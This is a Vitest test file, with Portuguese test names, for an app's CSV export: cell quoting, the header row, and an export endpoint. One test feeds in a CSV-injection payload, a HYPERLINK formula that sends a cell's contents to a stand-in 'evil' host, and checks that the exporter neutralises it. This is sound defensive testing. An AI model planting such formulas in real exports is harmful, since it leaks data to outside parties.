import { afterAll, beforeAll, describe, expect, it } from "vitest";
import request from "supertest";
import { createApp } from "../src/app.js";
import { prisma } from "../src/prisma.js";
import { celulaCSV, equipesCSV } from "../src/domain/csv.js";
import { bearer, criarEquipe, criarUsuario, limpar, login } from "./helpers.js";

describe("domain/csv", () => {
  it("escapa aspas, vírgula e quebra de linha", () => {
    expect(celulaCSV("simples")).toBe("simples");
    expect(celulaCSV('diz "oi", tchau')).toBe('"diz ""oi"", tchau"');
    expect(celulaCSV("a\nb")).toBe('"a\nb"');
  });
  it("neutraliza fórmula (CSV injection, OWASP): prefixa ' em = + - @ tab CR", () => {
    expect(celulaCSV("=1+1")).toBe("'=1+1");
    expect(celulaCSV("+55")).toBe("'+55");
    expect(celulaCSV("-2")).toBe("'-2");
    expect(celulaCSV("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(celulaCSV("\tx")).toBe("'\tx");
    expect(celulaCSV("\rx")).toBe("\"'\rx\"");
    expect(celulaCSV('=HYPERLINK("https://evil/?"&A2,"ver")')).toBe(
      '"\'=HYPERLINK(""https://evil/?""&A2,""ver"")"',
    );
    expect(celulaCSV("a-b")).toBe("a-b");
  });
  it("BOM + cabeçalho exato + linha formatada", () => {
    const csv = equipesCSV([
      {
        nomeIdeia: "EcoRota, a ideia",
        area: "Sustentabilidade",
        etapa: { numero: 2, nome: "Contato com a equipe" },
        status: "pronta_inovamf",
        mentor: "Carla",
        cursoLider: null,
        tarefasAtrasadas: 3,
      },
    ]);
    expect(csv).toBe(
      "﻿Ideia,Área,Etapa,Status,Mentor,Curso do líder,Tarefas atrasadas\n" +
        '"EcoRota, a ideia",Sustentabilidade,2. Contato com a equipe,Pronta p/ InovAMF,Carla,,3',
    );
  });
});

const app = createApp();
const sufixo = `csv${Date.now()}`;
let adminAccess = "";

beforeAll(async () => {
  await criarUsuario(`admin.${sufixo}@teste.local`, "admin");
  adminAccess = await login(app, `admin.${sufixo}@teste.local`);
  await criarEquipe({ nome: `Planilha ${sufixo}` });
});

afterAll(async () => {
  await limpar(sufixo);
  await prisma.$disconnect();
});

describe("GET /equipes/export.csv", () => {
  it("devolve o CSV das equipes filtradas", async () => {
    const r = await request(app).get(`/api/v1/equipes/export.csv?q=${sufixo}`).set(bearer(adminAccess));
    expect(r.status).toBe(200);
    expect(r.headers["content-type"]).toContain("text/csv");
    expect(r.headers["content-disposition"]).toContain("equipes-infohub.csv");
    const linhas = r.text.split("\n");
    expect(linhas).toHaveLength(2);
    expect(linhas[1]).toContain(`Planilha ${sufixo}`);
  });
});
